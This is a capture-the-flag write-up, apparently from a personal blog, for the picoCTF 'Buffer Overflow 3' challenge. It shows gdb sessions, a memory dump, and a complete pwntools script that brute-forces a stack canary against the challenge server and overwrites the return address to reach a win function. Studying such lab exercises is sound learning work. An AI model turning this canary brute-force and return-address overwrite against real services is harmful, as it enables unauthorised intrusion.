---
title: "Buffer Overflow 3"
date: 2025-10-20T22:42:46+05:30
draft: False
---

As usual, we are given compiled binary, its source and the host and port where challenge is hosted. This given challenge simulates a stack canary which we have to bypass. Well we could leak the canary code, but here we will take the bruteforce approach.First we need to create flag.txt with a flag and canary.txt file with 4 byte canary string. I chose the word CANA as the canary string for testing locally. The size of canary is defined in the source code as `#define CANARY_SIZE 4`. The application reads the canary string from the canary.txt file and places it somewhere in memory.


```bash
[*] '/home/ankit/writeups/buff_ovrfl_3/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Running this in gdb we get 

```bash
gef➤  r
Starting program: /home/ankit/writeups/buff_ovrfl_3/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 64
Input> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
***** Stack Smashing Detected ***** : Canary Value Corrupt!
[Inferior 1 (process 9905) exited normally]
```

### Finding the Canary

Canary starts at offset 64. Bruteforce it byte-by-byte by sending 64 * 'A' + known_prefix + trial_byte.
If the program replies "Ok... Now Where's the Flag?" the trial byte is correct; if it crashes with `*** Stack Smashing Detected ***** : Canary Value Corrupt!` it’s wrong. Now all we have to do is repeat, appending each discovered byte to the prefix and increasing the total input length by 1 until the full canary is recovered.
After hit and trail we get to something like this, here we can conclude that passing the canary after the offset doesnt end in a `*** Stack Smashing Detected ***** : Canary Value Corrupt!`, which means everything is working.

```bash
gef➤  r
Starting program: /home/ankit/writeups/buff_ovrfl_3/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 68
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACANA
Ok... Now Where's the Flag?
[Inferior 1 (process 10357) exited normally]
```

Now if we try to read the first 68 bytes from the position `ebp-0x50`, essentially dumping the `ebp` after putting a breakpoint, we find this.

```asm
gef➤  x/68bx $ebp-0x50
0xffffcca8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffccb0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffccb8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffccc0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffccc8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffccd0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffccd8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffcce0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffcce8:	0x43	0x41	0x4e	0x41
```

The `0x41`s from `0xffffcca8` to `0xffffcce0` are basically `A*68`. And the rest `0xffffcce8` is the canary value.

### Finally...

With all the knowledge we have gathered poking around, we can finally write the exploit script. Also I wanted to convey that this following code isn't written by me, my code looked awful and barely worked. So I scraped it off of a [blog](https://flippingbitz.com/post/picoctf-bo3/). So yeah, thanks hoodie guy.

```python
from pwn import *
import sys
import string
import argparse


canary_offset = 64
canary_size = 4

canary = b""

chall = ELF("./vuln")


def get_process():
    return remote('saturn.picoctf.net', 55800)


for i in range(1,5):

        for canary_char in string.printable:

                r = get_process()

                r.sendlineafter(b"> ", b"%d" % (canary_offset + i))


                payload = b"A"* canary_offset + canary
                payload += canary_char.encode()


                r.sendlineafter(b"> ", payload)

                resp = r.recvall()

                print (resp)

                if b"Now Where's the Flag" in resp:
                        canary += canary_char.encode()
                        break
                r.close()

if not len(canary) == 4:
        print ("[-] Failed to find canary!")
        sys.exit()

else:
        print ("[+] Found canary : %s" % canary.decode())

win = 0x8049336

payload = b"A" * 64         
payload += canary
payload += b"A" * 16          
payload += p32(win)


r = get_process()
r.sendlineafter(b"> ", b"%d" % len(payload))

r.sendlineafter(b"> ", payload)
resp = r.recvall()
print (resp)

```

Letting this run for about 5 mins would get you your flag. Good luck.
   

